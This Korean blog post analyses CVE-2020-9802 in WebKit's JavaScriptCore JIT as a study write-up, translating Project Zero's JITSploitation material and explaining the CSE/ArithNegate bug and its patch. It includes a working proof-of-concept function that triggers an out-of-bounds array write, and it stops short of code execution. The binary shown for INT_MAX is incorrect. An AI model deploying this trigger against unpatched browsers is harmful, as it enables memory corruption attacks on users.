---
layout: post
date: 2024-11-25
title: "CVE-2020-9802(Webkit) 분석"
tags: [pwnable, webkit, memory corruption, ]
categories: [1-day, open-source, ]
---

해당 글은 Google Project Zero 팀의 JITSploitation 게시글 번역 및 익스플로잇을 작성한 내용에 대해 기술하고 있습니다.

## 개요

---

**CVE-2020-9802 :** 악성 웹 콘텐츠를 처리하는 과정에서 임의코드가 실행될 수 있음

### Javascript JIT

```jsx
function foo(o, y) {
    let x = o.x;
    return x + y;
}

for (let i = 0; i < 10000; i++) {
    foo({x: i}, 42);
}
```

JIT 컴파일은 리소스 비용이 많이 들기 때문에 반복적인 코드에 대해서만 수행된다.

따라서 함수 foo는 인터프리터 내부에서 실행되며, 값에 대한 프로필이 수집된다.

예를 들어 함수 foo는 다음과 같은 프로필을 가진다.

```
o: JSObject with a property .x at offset 16
x: Int32
y: Int32
```

JIT 컴파일러가 최적화를 시작하면 Javascript 코드(또는 인터프리터 바이트코드)를 JIT 컴파일러 자체의 IR로 변환한다.

위 동작은 JavascriptCore의 최적화 컴파일러인 DFG의 `DFGByteCodeParser`에 의해 수행된다.

함수 foo의 DFG IR은 다음과 같다.

```
v0 = GetById o, .x
v1 = ValueAdd v0, y
Return v1
```

위에서 GetById 및 ValueAdd 명령어는 다양한 입력 유형을 처리하는 고수준 명령어이다.

예시로 ValueAdd는 문자열을 합치는 것도 가능하다.

다음으로 JIT 컴파일러는 값에 대한 프로필을 검사하며, 미래에 비슷한 입력 유형으로 쓰일 것이라고 예상한다.

위의 경우에는 o가 JSObject이며, x 및 y가 Int32의 유형을 가진다고 추측한다.

그러나 이 추측이 항상 옳다는 보장이 없기 때문에 일반적으로 컴파일러는 값 싼 런타임 유형 검사를 통해 이 추측을 보호한다.

```
CheckType o, “Object with property .x at offset 16”
CheckType y, Int32
v0 = GetByOffset o, 16
CheckType v0, Int32
v1 = ArithAdd v0, y
Return v1
```

최적화가 끝나면 IR이 기계어로 변환된다.

### **Common-Subexpression Elimination (CSE)**

CSE는 이름 그대로 중복되는 계산식, 표현식을 감지하고 하나의 계산으로 병합하는 최적화 방법이다.

```jsx
let c = Math.sqrt(a*a + a*a);
```

위와 같은 코드는 Javascript JIT 컴파일러가 다음과 같이 변환한다.

```jsx
let tmp = a*a;
let c = Math.sqrt(tmp + tmp);
```

위와 같은 방식으로 런타임에 ArithMul(산술 연산)을 저장한다.

이러한 최적화를 CSE라고 한다.

아래와 같은 코드는 `f`함수에서 `o.a`의 속성 값이 변경되었을 수 있기 때문에 CSE가 최적화할 수 없다.

```jsx
let c = o.a;
f();
let d = o.a;
```

CSE 대상이 될 수 있는지에 대한 여부는 `DFGClobberize`에서 처리된다.

`ArithMul`의 경우에는 다음과 같이 처리한다.

```jsx
case ArithMul:
        switch (node->binaryUseKind()) {
        case Int32Use:
        case Int52RepUse:
        case DoubleRepUse:
            def(PureValue(node, node->arithMode()));
            return;
        case UntypedUse:
            clobberTop();
            return;
        default:
            DFG_CRASH(graph, node, "Bad use kind");
        }
```

여기서 def 함수의 PureValue 함수는 계산이 어떤 컨텍스트에도 의존하지 않기 때문에 동일한 입력이 주어질 때 항상 동일한 결과를 반환한다.(뭔 소린지 모르겠음)

또한 ArithMode의 매개변수를 이용하여 PureValue 함수의 작동 방식을 지정할 수 있다.

예를 들어 정수 오버플로우를 다르게 처리하는 두 ArithMul 작업이 서로 대체되는 것을 방지할 수 있다.

오버플로우를 처리하는 작업은 “checked” 연산이라고 하며, 오버플로우를 감지하지 않고 처리하지 않는 작업은 “unchecked” 연산이라고 한다.

## 취약점 분석

---

해당 취약점은 음수를 처리하는 `ArithNegate`에서 발생한다.

`ArithNegate`는 32비트 정수의 NOT 연산을 처리한다.

```c
case ArithNegate:
        if (node->child1().useKind() == Int32Use || ...)
            def(PureValue(node));          // <- only the input matters, not the ArithMode
```

위 코드가 CSE의 `checked` 연산을 `unchecked` 연산으로 유도할 수 있다.

해당 취약점은 INT_MIN(-2147483648)을 NOT 연산할 때 발생한다.

2147483648 같은 경우는 INT 자료형으로 표시할 수 없는 값이기 때문에 INT_MIN이 되게 된다.

- INT_MIN : -2147483648 (1000 0000 0000 0000 0000 0000 0000 0000)
- INT_MAX : 2147483647 (1000 0000 0000 0000 0000 0000 0000 0001)
- -INT_MIN : 2147483648 → -2147483648 (1000 0000 0000 0000 0000 0000 0000 0000)

해당 버그에 대한 패치는 다음과 같다.

```
-            def(PureValue(node));
+            def(PureValue(node, node->arithMode()));
```

`arithMode`를 고려하도록 하여 두개의 연산이 서로 대체되지 않도록 하였다.

해당 버그는 `ArithNegate` 뿐만 아니라 `ArithAbs`에서도 발생한다.

해당 버그를 통해 OOB를 트리거 할 수 있다.

### OOB 트리거

---

아래 코드는 해당 버그를 통해 OOB를 트리거 할 수 있다.

```jsx
function hax(arr, n) {
    n |= 0;
    if (n < 0) {
        let v = (-n)|0;
        let i = Math.abs(n);
        if (i < arr.length) {
            if (i & 0x80000000) {
                i += -0x7ffffff9;
            }
            if (i > 0) {
                arr[i] = 1.04380972981885e-310;
            }
        }
    }
}
```

먼저 ArithNegate 작업은 정수를 부정하는데에 사용된다.(고수준 작업인 ValueNegate 작업은 모든 값을 부정할 수 있음) 그러나 자바스크립트의 숫자는 일반적으로 부동소수점 값이다.

따라서 파라미터 n이 항상 정수임을 컴파일러에게 알려줄 필요가 있다.

```jsx
n = n|0;   // n은 이제 항상 정수형이다.
```

다음을 통해 unchecked ArithNegate 작업을 수행하도록 구성할 수 있다.

```jsx
n = n|0; // n은 정수
let v = (-n)|0; // 정수형 데이터 부정
```

위의 코드가 `unchecked` 연산이 되는 이유는 부정된 값에 대한 연산이 or 연산뿐이고, 오버플로우 된 값과 오버플로우 되지 않은 값이 동일하므로 오버플로우 검사가 생략될 수 있다.


다음으로 `n`을 사용하여 `checked ArithNegate` 연산을 구성해야한다.

```jsx
n = n|0;
if (n < 0) {
    // Compiler knows that n will be a negative integer here

    let v = (-n)|0;
    let i = Math.abs(n);
}
```

이제 컴파일러가 `Math.abs`를 `ArithAbs`로 변환시킨다.

이후에 `IntegerRangeOptimization`가 `ArithAbs`를 `checked ArithNegate`로 변환시킨다.(n이 INT_MIN일 경우를 확인해야 함)

따라서 위의 코드의 IR은 다음과 같아진다.

```jsx
v = ArithNeg(unchecked) n
i = ArithNeg(checked) n
```

위에서 설명한 버그로 인해 CSE는 IR을 다음과 같이 변환한다.

```jsx
v = ArithNeg(unchecked) n
i = v
```

이제 `IntegerRangeOptimization`는 `i`를 양수로 알고 있다.

이제 범위 검사를 제거하려면 컴파일러에게 `i`가 배열의 길이보다 작다는 것을 알려야한다.

다음과 같이 범위 검사를 제거할 수 있다.

```jsx
function hax(arr, n) {
  n = n|0;
  if (n < 0) {
    let v = (-n)|0;
    let i = Math.abs(n);
    if (i < arr.length) {
        arr[i];
    }
  }
}
```

이제 i가 범위 검사를 통과하고 배열 액세스를 수행한다.

`IntegerRangeOptimization`이 `i`가 범위 내에 있다고 잘못 판단했기 때문에 범위 검사가 제거된다.

너무 어려워서… 쉘 따기는… 패스…

## Reference

---

https://googleprojectzero.blogspot.com/2020/09/jitsploitation-one.html

https://googleprojectzero.blogspot.com/2020/09/jitsploitation-two.html

https://bugs.chromium.org/p/project-zero/issues/detail?id=2020#c4

https://www.4hou.com/posts/2JL1

https://xz.aliyun.com/t/8913

https://www.anquanke.com/post/id/245946

https://github.com/shxdow/exploits/blob/39440b58b57c4254cc42e5c8bb22006700064f7f/CVE-2020-9802.js#L4

https://webkit.org/blog/10308/speculation-in-javascriptcore/

https://sillycross.github.io/2021/09/12/2021-09-12/